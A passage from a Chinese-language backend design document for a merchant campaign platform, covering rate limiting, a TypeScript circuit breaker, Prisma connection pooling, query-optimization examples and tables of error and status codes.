  res.set({
    'X-RateLimit-Limit': config.maxRequests,
    'X-RateLimit-Remaining': result.remaining,
    'X-RateLimit-Reset': result.resetAt,
  });
  
  if (!result.allowed) {
    return res.status(429).json({
      code: 429,
      message: '请求过于频繁,请稍后再试',
      data: {
        retryAfter: Math.ceil((result.resetAt - Date.now()) / 1000),
      },
    });
  }
  
  next();
}
```

#### 7.3.4 熔断器

```typescript
// 熔断器配置
const circuitBreakerConfig = {
  failureThreshold: 5,      // 失败5次后开启熔断
  successThreshold: 2,       // 成功2次后关闭熔断
  timeout: 10000,           // 10秒超时
  halfOpenTime: 30000,      // 30秒后半开
};

// 熔断器实现
class CircuitBreaker {
  private state: 'CLOSED' | 'OPEN' | 'HALF_OPEN' = 'CLOSED';
  private failureCount = 0;
  private successCount = 0;
  private nextAttempt: number;
  
  async execute<T>(fn: () => Promise<T>): Promise<T> {
    if (this.state === 'OPEN') {
      if (Date.now() < this.nextAttempt) {
        throw new Error('Circuit breaker is OPEN');
      }
      this.state = 'HALF_OPEN';
    }
    
    try {
      const result = await Promise.race([
        fn(),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Timeout')), circuitBreakerConfig.timeout)
        ),
      ]);
      
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }
  
  private onSuccess() {
    this.failureCount = 0;
    if (this.state === 'HALF_OPEN') {
      this.successCount++;
      if (this.successCount >= circuitBreakerConfig.successThreshold) {
        this.state = 'CLOSED';
        this.successCount = 0;
      }
    }
  }
  
  private onFailure() {
    this.failureCount++;
    if (this.failureCount >= circuitBreakerConfig.failureThreshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + circuitBreakerConfig.halfOpenTime;
    }
  }
}
```

### 7.4 数据库连接池优化

```typescript
// Prisma连接池配置
const prisma = new PrismaClient({
  datasources: {
    db: {
      url: process.env.DATABASE_URL,
    },
  },
  log: ['warn', 'error'],
});

// PostgreSQL连接池参数
// DATABASE_URL格式:
// postgresql://user:password@host:5432/database?pool_timeout=10&pool_max_conns=20

// 监控连接池状态
setInterval(async () => {
  const metrics = await prisma.$metrics();
  console.log({
    connections: metrics.all(),
    idle: metrics.idle(),
    active: metrics.active(),
  });
}, 30000);
```

### 7.5 查询优化建议

```typescript
// 1. 避免N+1查询
// ❌ 错误
const campaigns = await prisma.campaign.findMany();
for (const campaign of campaigns) {
  const merchant = await prisma.merchant.findUnique({ where: { id: campaign.merchantId } });
}

// ✅ 正确
const campaigns = await prisma.campaign.findMany({
  include: { merchant: true }
});

// 2. 使用select减少返回字段
// ✅ 正确
const users = await prisma.user.findMany({
  select: { id: true, phone: true, nickname: true }
});

// 3. 分页查询优化
// ✅ 正确 - 使用游标分页
const submissions = await prisma.taskSubmission.findMany({
  where: { campaignId },
  take: 20,
  skip: 1,
  cursor: { id: lastId },
  orderBy: { createdAt: 'desc' },
});

// 4. 批量操作
// ✅ 正确
await prisma.taskSubmission.updateMany({
  where: { campaignId, status: 1 },
  data: { status: 2, reviewedAt: new Date() }
});
```

---

## 附录

### A. 错误码定义

| 错误码 | 名称 | 说明 |
|--------|------|------|
| 0 | SUCCESS | 成功 |
| 400 | BAD_REQUEST | 请求参数错误 |
| 401 | UNAUTHORIZED | 未登录 |
| 403 | FORBIDDEN | 无权限 |
| 404 | NOT_FOUND | 资源不存在 |
| 409 | CONFLICT | 资源冲突 |
| 429 | TOO_MANY_REQUESTS | 请求过于频繁 |
| 500 | INTERNAL_ERROR | 服务器内部错误 |

### B. 状态码定义

| 资源 | 状态值 |
|------|--------|
| 用户 status | 0-禁用, 1-正常 |
| 商家 status | 0-禁用, 1-正常, 2-待审核 |
| 门店 status | 0-禁用, 1-正常 |
| 员工 role | 1-管理员, 2-店长, 3-店员 |
| 活动 status | 0-草稿, 1-待审核, 2-进行中, 3-已结束, 4-已下线 |
| 任务类型 taskType | 1-NFC触发, 2-拍照打卡, 3-AI生成, 4-加企微, 5-填写信息 |
| 提交 status | 0-草稿, 1-待审核, 2-已通过, 3-已拒绝, 4-已撤回 |
| 奖励类型 rewardType | 1-优惠券, 2-红包, 3-积分, 4-实物, 5-兑换码 |
| 领取状态 | 1-已领取, 2-已使用, 3-已过期, 4-已失效 |
| NFC卡类型 cardType | 1-桌贴, 2-立牌, 3-手牌 |

---

*文档版本: 1.0.0*
*最后更新: 2024-06-01*